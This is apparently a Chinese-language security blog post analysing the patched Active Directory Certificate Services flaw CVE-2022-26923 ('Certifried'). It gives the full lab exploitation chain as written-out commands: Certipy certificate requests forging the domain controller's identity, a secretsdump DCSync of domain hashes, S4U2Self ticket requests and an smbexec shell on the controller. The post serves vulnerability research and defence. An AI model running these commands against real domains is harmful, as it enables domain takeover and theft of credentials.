---
title: Certifried - Active Directory 域权限提升漏洞（CVE-2022–26923）
date: 2022-05-12 00:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Active Directory", "Domain Persistence", "ADCS", "PKINIT"]
layout: post
---

2022 年 5 月 10 日，微软发布补丁修复了一个 Active Directory 域权限提升漏洞（CVE-2022–26923）。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了 Active Directory 证书服务（AD CS）服务器角色的 Active Directory 环境中将权限提升至域管理员。这一漏洞最早由安全研究员 Oliver Lyak（[@ly4k_](https://twitter.com/ly4k_)）在 2021 年 12 月 14 日通过 Zero Day Initiative 向微软报告，Microsoft 在 2022 年 5 月的安全更新中对其进行了修补。



![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512004633136.png)

## 漏洞背景

在 2021 年的 BlackHat 大会上，Lee Christensen（[@tifkin_](https://twitter.com/tifkin_)）和 Will Schroeder（[@harmj0y](https://twitter.com/harmj0y)）发布了名为 [*Certified Pre-Owned - Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 的白皮书，详细介绍了关于 Active Directory Certificate Services 的滥用方法，关于 Active Directory 证书服务的攻击方法第一次系统性的进入我们的视野。

### Active Directory 证书服务

Active Directory 证书服务（Active Directory Certificate Services，AD CS），是 Microsoft 对 PKI 的实现，它与现有的 Active Directory 森林集成，并提供从加密文件系统到数字签名，再到客户端身份验证（本文的重点）等一切功能。虽然默认情况下没有为 Active Directory 环境安装 AD CS，但它如今已被广泛部署在各大企业和组织中。

> PKI 是一个术语，有些地方会采用中文的表述——公钥基本结构，用来实现证书的产生、管理、存储、分发和撤销等功能。我们可以把他理解成是一套解决方案，这套解决方案里面需要有证书颁发机构，有证书发布，证书撤掉等功能。

### Active Directory 证书注册流程

要从 AD CS 获取证书，客户端需要经过⼀个称为注册的过程。概括地说，在注册期间，客户端⾸先根据活动目录 Enrollment Services 容器中的对象找到企业 CA。然后，客户端⽣成⼀个公钥/私钥对，并将公钥、证书主题和证书模板名称等其他详细信息⼀起放⼊证书签名请求（CSR）消息中。然后，客户端使⽤其私钥签署 CSR，并将 CSR 发送到企业 CA 服务器。CA 服务器检查客户端是否可以请求证书。如果是，它会通过查找 CSR 中指定的证书模板 AD 对象来确定是否会颁发证书。CA 将检查证书模板 AD 对象的权限是否允许该账户获取证书。如果是，CA 将使用证书模板定义的 “蓝图” 设置（例如，EKU、加密设置和颁发要求等）并使用 CSR 中提供的其他信息（如果证书的模板设置允许）生成证书。CA 使用其私钥签署证书，然后将其返回给客户端。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/wTzhCQOfIlK6rmE.png)


CA 颁发的证书可以提供加密（例如，加密⽂件系统）、数字签名（例如，代码签名）和⾝份验证（例如，对 AD）等多种服务，但本⽂将主要关注证书在客户端⾝份验证方面。

> 了解更多细节，请读者自行参考前文中提到的 *Certified Pre-Owned* 白皮书。笔者也曾对其中的技术进行翻译和记录，感兴趣的读者可以阅读我的博客：[*Attack Surface Mining For AD CS*](https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/)

### 使用 AD CS 证书进行客户端身份验证

下面，让我们来简单演示一下如何在 Active Directory 中使用证书进行身份验证，这里我们直接使用漏洞作者开源的 [Certipy](https://github.com/ly4k/Certipy) 工具。

首先通过 Certipy 在 Marcus 用户的上下文中指定证书模板，为该用户申请证书，生成的证书将保存在 .pfx 格式的文件中，如下图所示。

```bash
certipy req pentest.com/Marcus:Marcus\@123@adcs.pentest.com -ca 'pentest-ADCS-CA-2' -template 'User'
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511213916567.png)

然后，我们可以使用颁发的证书对 KDC 进行 PKINIT Kerberos 身份验证，并获取该用户的 TGT 票据，如下图所示。

```bash
certipy auth -pfx marcus.pfx -username Marcus -domain pentest.com -dc-ip 172.26.10.11
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511214649422.png)

## 漏洞分析

默认情况下，域用户可以注册 User 证书模板，域计算机可以注册 Machine 证书模板。两个证书模板都允许客户端身份验证。

当用户账户申请 User 模板证书时，用户帐户的用户主体名称（User Principal Name，UPN）将嵌入到证书中以进行识别。当我们使用证书进行身份验证时，KDC 会尝试将 UPN 从证书映射到目标用户。User 证书模板的 `msPKI-Certificate-Name-Flag` 属性存在一个 `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` 标志位，其指示 CA 将来自 Active Directory 中请求者用户对象的 UPN 属性值添加到已颁发证书的主题备用名称中。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511215502035.png)

根据微软的 “[MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944))” 规范，UPN 必须是唯一的，这意味着不能同时有两个具有相同 UPN 的用户。例如，如果我们尝试将域用户 William 的 UPN 更改为`Marcus@pentest.com`，这将引发一个约束冲突，如下图所示。因为 `Marcus@pentest.com` 这个 UPN 已经被 Marcus 用户独占。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511221853399.png)

### dNSHostName

值得注意的是，计算机账户是没有 UPN 属性的，那么计算机在使用证书进行身份验证时，是靠什么识别认证账户的呢？当我们查看微软官方文档时，会发现证书模板的 `msPKI-Certificate-Name-Flag` 属性还存在一个 `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` 标志位，其指示 CA 将从 Active Directory 中请求者用户对象的 DNS 属性获得的值添加到已颁发证书的主题备用名称中。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511222311143.png)

也就是说，当计算机账户申请证书时，计算机的 DNS 属性值将被嵌入到证书中以进行识别。

为了进一步验证，我们使用 Marcus 用户在域内创建一个名为 `PENTEST$`，密码为 Passw0rd 的计算机账户，并为这个 `PENTEST$` 账户申请 AD CS 证书，如下图所示。

```bash
# 通过 Impacket 套件添加计算机账户 PENTEST$
python3 addcomputer.py pentest.com/Marcus:Marcus\@123 -method LDAPS -computer-name PENTEST\$ -computer-pass Passw0rd -dc-ip dc01.pentest.com
# 通过 Certipy 为 PENTEST$ 账户申请证书
certipy req pentest.com/PENTEST\$:Passw0rd@adcs.pentest.com -ca 'pentest-ADCS-CA-2' -template 'Machine'
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511223341069.png)

从执行结果中可以看到，证书 pentest.pfx 是使用 `PENTEST$` 的 DNS 主机名 `PENTEST.pentest.com` 颁发的。如果在 Active Directory 查看计算机帐户 `PENTEST$` ，我们可以注意到这个 DNS 主机名在 `dNSHostName` 属性中定义，如下图所示。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511223642921.png)

**看到这里您可能已经明白这个漏洞产生的具体原因了，如果我们将 `PENTEST$` 账户的 `dNSHostName` 值改为与域控制器的计算机账户相同的 `dNSHostName` 值，那么是否意味着我们可以欺骗 AD CS，并最终申请到域控制器的 AD 证书呢？事实证明这的确是可以的。**

如果我们阅读 “[MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944)” 文档，其中并没有提及计算机帐户的 `dNSHostName`  属性必须是唯一的。并且，对于计算机账户的创建者来说，他们拥有对目标计算机的 “Validated write to computer attributes” 权限，也就是说计算机账户的创建对计算机对象的 AD 属性具有写入权限。综上所述，我们完全可以在 Marcus 用户的上下文中，将 `PENTEST$` 账户的 `dNSHostName` 属性值改为域控制器的 DNS 主机名（在我的测试环境中，域控的 DNS 主机名为 `DC01.pentest.com`）。

但是，当我们实际操作时，将引发一个为止的操作错误，如下图所示。这里的错误不同于前文中更改 William 用户的 UPN 时引发的错误。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511224711877.png)

### servicePrincipalName

回顾 2021 年微软披露的 noPac 域内提权漏洞，其允许攻击者修改计算机账户的 `sAMAccountName` 属性来冒充域控制器，并获得针对域控制器上服务的高权限票据。但是实际利用中，在修改 `sAMAccountName` 属性值的之前，我们需要预先清除掉计算机账户的 `servicePrincipalName` 属性。这是因为 `sAMAccountName` 属性与 `servicePrincipalName` 属性相关联，`servicePrincipalName` 属性存储了该账户所注册的服务主体名称（Service Principal Names，SPN），在修改 `samAccountName` 值的时候 `servicePrincipalName` 将使用 `samAccountName` 的新值自动更新。

同样，`dNSHostName` 属性也与 `servicePrincipalName` 属性相关联。如果我们修改 `PENTEST$` 账户的 `dNSHostName` 属性值，那么 `PENTEST$` 账户的 `servicePrincipalName` 属性中默认的 `RestrictedKrbHost/PENTEST.pentest.com` 和 `HOST/PENTEST.pentest.com` 这两条 SPN 将使用新的 DNS 主机名更新。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511233354344.png)

由于前文中我们尝试将 `PENTEST$` 账户的 `dNSHostName` 属性值改为 `DC01.pentest.com`，那么这两条 SPN 将自动更新为 `RestrictedKrbHost/DC01.pentest.com` 和 `HOST/DC01.pentest.com`，而这两条 SPN 已被域控制器的 `servicePrincipalName` 属性所独占。根据 “[MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944)” 文档中所描述的，`servicePrincipalName` 属性具有唯一性，所以将与 `DC01$` 的 `servicePrincipalName` 属性引发约束冲突。

因此，在修改 `dNSHostName` 属性时，我们需要预先删除 `PENTEST$` 账户中包含 `dNSHostName` 的 `servicePrincipalName` 属性值，如下图所示。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220511235753108.png)

然后再次尝试将 `PENTEST$` 账户的 `dNSHostName` 属性值改为 `DC01.pentest.com`，如下图所示，修改成功。

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512000012863.png)

### 为域控申请证书

到此为止，如果我们以计算机账户 `PENTEST$` 的身份申请 Machine 模板证书，`PENTEST$` 的 `dNSHostName` 属性值将嵌入到证书中作为主题备用名称。由于 `PENTEST$` 的 `dNSHostName` 属性值已被修改为 `DC01.pentest.com`，因此将为我们颁发域控制器的计算机账户的证书，如下图所示。

```bash
certipy req pentest.com/PENTEST\$:Passw0rd@adcs.pentest.com -ca 'pentest-ADCS-CA-2' -template 'Machine'
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512000544983.png)

接着，我们通过颁发的证书对 KDC 进行 PKINIT Kerberos 身份验证，并获取域控制器账户的 TGT 票据，如下图所示。

```bash
certipy auth -pfx dc01.pfx -username DC01\$ -domain pentest.com -dc-ip 172.26.10.11
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512000823445.png)

由于域控制器账户拥有所需特权，我们可以设置环境变量 `KRB5CCNAME`，通过 [Impacket](https://github.com/SecureAuthCorp/impacket) 套件中的 secretsdump.py 使用该票据，并执行 DCSync 来转储域用户哈希，如下图所示。

```bash
export KRB5CCNAME=/root/dc01.ccache
python3 secretsdump.py -k pentest.com/dc01\$@dc01.pentest.com -no-pass -just-dc
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512001120655.png)

此外，我们可以通过 Kerberos 的 S4U2Self 扩展协议，使用已获取的域控 TGT 为域管理员用户申请针对域控上其他服务的的 ST 票据。这里我们借助 Dirk-jan Mollema（[@dirkjanm](https://twitter.com/_dirkjan)）的 [PKINITtools](https://github.com/dirkjanm/PKINITtools) 工具来操作，请求的是域控制器的 CIFS 服务，相关命令如下：

```bash
python3 gets4uticket.py kerberos+ccache://pentest.com\\dc01\$:dc01.ccache@dc01.pentest.com cifs/dc01.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache -v
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512001432630.png)

然后，我们可以通过设置环境变量 `KRB5CCNAME` 来使用获取到的 Administrator 用户的票据，并通过 smbexec.py 获取域控制器的最高权限，相关命令如下。

```bash
export KRB5CCNAME=/root/PKINITtools/Administrator.ccache
python3 smbexec.py -k pentest.com/Administrator@dc01.pentest.com -no-pass
```

![](/assets/posts/2022-05-12-certifried-active-directory-domain-privilege-escalation/image-20220512001604399.png)
## Ending......

参考文献：

> https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
>
> https://whoamianony.top/attack-surface-mining-for-ad-cs/
>
> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944
>
> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1
>
> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1
